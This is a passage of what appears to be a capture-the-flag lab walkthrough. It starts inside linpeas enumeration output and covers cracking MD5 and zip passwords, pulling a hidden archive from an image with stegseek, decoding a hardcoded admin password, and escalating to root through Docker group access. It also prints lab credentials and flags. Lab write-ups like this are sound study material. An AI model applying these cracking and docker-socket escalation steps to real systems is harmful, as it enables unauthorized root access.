╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
/dev/mqueue                                                                                                                                                                                                                                 
/dev/shm
/dev/shm/linpeas.sh
/run/lock
/run/lock/apache2
/run/screen
/tmp
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/containerd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/docker.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/docker.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-lvm2x2dpvscan.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/vsftpd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords in history files
                                                                                                                                                                                                                                            
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                                                                                   
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/usr/share/ubuntu-advantage-tools/modules/credentials.sh
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:                                                                                                                                                                                            
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2020-08-06 22:35:30 install base-passwd:amd64 <none> 3.5.44
2020-08-06 22:35:30 status half-installed base-passwd:amd64 3.5.44
2020-08-06 22:35:31 configure base-passwd:amd64 3.5.44 3.5.44
2020-08-06 22:35:31 status half-configured base-passwd:amd64 3.5.44
2020-08-06 22:35:31 status unpacked base-passwd:amd64 3.5.44
2020-08-06 22:35:32 status installed base-passwd:amd64 3.5.44
2020-08-06 22:35:38 status half-configured base-passwd:amd64 3.5.44
2020-08-06 22:35:38 status half-installed base-passwd:amd64 3.5.44
2020-08-06 22:35:38 status unpacked base-passwd:amd64 3.5.44
2020-08-06 22:35:38 upgrade base-passwd:amd64 3.5.44 3.5.44
2020-08-06 22:35:44 install passwd:amd64 <none> 1:4.5-1ubuntu1
2020-08-06 22:35:44 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-08-06 22:35:44 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-08-06 22:35:45 configure base-passwd:amd64 3.5.44 <none>
2020-08-06 22:35:45 status half-configured base-passwd:amd64 3.5.44
2020-08-06 22:35:45 status installed base-passwd:amd64 3.5.44
2020-08-06 22:35:45 status unpacked base-passwd:amd64 3.5.44
2020-08-06 22:35:46 configure passwd:amd64 1:4.5-1ubuntu1 <none>
2020-08-06 22:35:46 status half-configured passwd:amd64 1:4.5-1ubuntu1
2020-08-06 22:35:46 status installed passwd:amd64 1:4.5-1ubuntu1
2020-08-06 22:35:46 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-08-06 22:37:45 configure passwd:amd64 1:4.5-1ubuntu2 <none>
2020-08-06 22:37:45 status half-configured passwd:amd64 1:4.5-1ubuntu1
2020-08-06 22:37:45 status half-configured passwd:amd64 1:4.5-1ubuntu2
2020-08-06 22:37:45 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-08-06 22:37:45 status installed passwd:amd64 1:4.5-1ubuntu2
2020-08-06 22:37:45 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-08-06 22:37:45 status unpacked passwd:amd64 1:4.5-1ubuntu2
2020-08-06 22:37:45 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
2020-10-03 03:40:15,105 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords - wb: [644] 25 bytes
2020-10-03 03:40:15,106 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
2020-10-03 03:40:15,153 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
2020-10-03 03:40:15,154 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2020-10-03 06:40:39,249 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-10-03 06:40:39,249 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-10-04 07:15:49,826 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-10-04 07:15:49,827 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
Binary file /var/log/cloud-init.log matches
Oct 03 03:34:06 ubuntu-server chage[14719]: changed password expiry for sshd
Oct 03 03:34:06 ubuntu-server usermod[14714]: change user 'sshd' password
Oct 03 09:16:01 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.44) ...
Setting up passwd (1:4.5-1ubuntu1) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.44) ...
Unpacking base-passwd (3.5.44) over (3.5.44) ...
Unpacking passwd (1:4.5-1ubuntu1) ...
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════       
```

Nothing really stand out, except maybe the mysql configuration files.

If we check in ```/var/www/files``` we find several files
```
account.php  hacker.php  images  index.php  style.css
```

```account.php``` seems to login users by checking users through the database, using an md5 encryption
```
<?php

class Account
{
        public function __construct($con)
        {
                $this->con = $con;
        }
        public function login($un,$pw)
        {
                $pw = hash("md5",$pw);
                $query = $this->con->prepare("SELECT * FROM users WHERE username='$un' AND password='$pw'");
                $query->execute();
                if($query->rowCount() >= 1)
                {
                        return true;
                }?>
                <h1 style="color:red";>Invalid username or password</h1>
        <?php }
}

?>
```

```hacker.php``` I'm not sure
```
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
        color:red;
        font-weight: bold;
}
h1
{
        color: yellow;
        font-weight: bold;
}
</style>
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```

Nothing interesting in ```style.css```

```index.php``` contains the login for database connection
```
<html>
<body>
<?php
        if(isset($_POST['submit']))
        {
                $username = $_POST['username'];
                $password = $_POST['password'];
                ob_start();
                session_start();
                try
                {
                        $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
                        $con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
                }
                catch(PDOException $e)
                {
                        exit("Connection failed ". $e->getMessage());
                }
                require_once("account.php");
                $account = new Account($con);
                $success = $account->login($username,$password);
                if($success)
                {
                        header("Location: hacker.php");
                }
        }
?>
<link rel="stylesheet" type="text/css" href="style.css">
        <div class="signInContainer">
                <div class="column">
                        <div class="header">
                                <h2 style="color:blue;">Customer Portal</h2>
                                <h3 style="color:green;">Log In<h3>
                        </div>
                        <form method="POST">
                                <?php echo $success?>
                                <input type="text" name="username" id="username" placeholder="Username" required>
                                <input type="password" name="password" id="password" placeholder="Password" required>
                                <input type="submit" name="submit" value="Submit">
                        </form>
                </div>
        </div>
</body>
</html>
```

Entering the username and password, we get in mysql
```
mysql -u root -p
Enter password: !@m+her00+@db
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Listing databases
```
mysql> show  databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)
```

Let's go to ```webportal``` database
```
mysql> use webportal
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
```

Let's check tables (we saw in ```account.php``` that we should have a user table)
```
mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)
```

And we have.

Let's check what's in it.
```
mysql> select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
```

We know passwords are md5, let's try crackstation
```
7e53614ced3640d5de23f111806cc4fd	md5	masterpassword
686216240e5af30df0501e53c789a649	md5	dontaskdonttell
```

Let's try these 2 passwords for root user. Didn't work.

Here, I got stuck. I looked at a walkthrough, and they say there is something hidden in the image in '/var/www/files/images/' (not sure how to find this), so I downloaded the image ```hacker-with-laptop_23-2147985341.jpg```, then running ```stegseek``` I found a .zip archives.

```
stegseek hacker-with-laptop_23-2147985341.jpg /opt/rockyou.txt

StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""

[i] Original filename: "backup.zip".
[i] Extracting to "hacker-with-laptop_23-2147985341.jpg.out".
```

However the archives is password protected. Let's John take care of it.
```
zip2john hacker-with-laptop_23-2147985341.zip > hacker-with-laptop_23-2147985341_forJohn.txt
```

Then
```
john hacker-with-laptop_23-2147985341_forJohn.txt --wordlist=/opt/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (hacker-with-laptop_23-2147985341.zip/source_code.php)     
1g 0:00:00:00 DONE (2022-11-03 04:46) 16.66g/s 204800p/s 204800c/s 204800C/s toodles..havana
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

After decompressing, we find a ```source_code.php```
```
<html>
<head>
	Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
			Email: <input type="email" name="email" placeholder="email"><br><br>
			Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
		</form>
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
		{ 
			$random = rand(1000,9999);?><br><br><br>
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
</html>
```

Which seems to be for an admin portal, with a base64 encoded password, probably for Anurodh as we can see in the page.

Decoding the password
```
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d

!d0ntKn0wmYp@ssw0rd  
```

Back to the host, now we can login as Anurodh
```
(remote) www-data@ubuntu:/var/www/files/images$ su anurodh
Password: !d0ntKn0wmYp@ssw0rd 
anurodh@ubuntu:/var/www/files/images$ 
```

His home directory contains the same ```source_code.php``` page.

Here I got stuck again. Not sure how you're supposed to find this, but if you look at groups
```
anurodh@ubuntu:~$ groups

anurodh docker
```

Anurodh is in the docker group and has write access to /var/run/docker.sock
```
anurodh@ubuntu:~$ ls -al /var/run/docker.sock

srw-rw---- 1 root docker 0 Nov  3 08:32 /var/run/docker.sock
```

Which, apparently, can be used to mount the host filesystem in the docker container.

With this command
```
docker run -it -v /:/mnt alpine chroot /mnt
```

You mount the host filesystem and get root privileges (??).
```
anurodh@ubuntu:~$ docker run -it -v /:/mnt alpine chroot /mnt
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@1b58fd84301f:/# 
```

Let's get flag
```
root@1b58fd84301f:/# cat /root/proof.txt 


                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a
```

## Flag

1. User

```
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

2. Privesc

```
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

# To Go Further

Honestly, I found this room pretty difficult compared to others. Several time I got stuck, not knowing what to do.

I still have to try to understand the very end, and also how you're supposed to know there is something in the images.
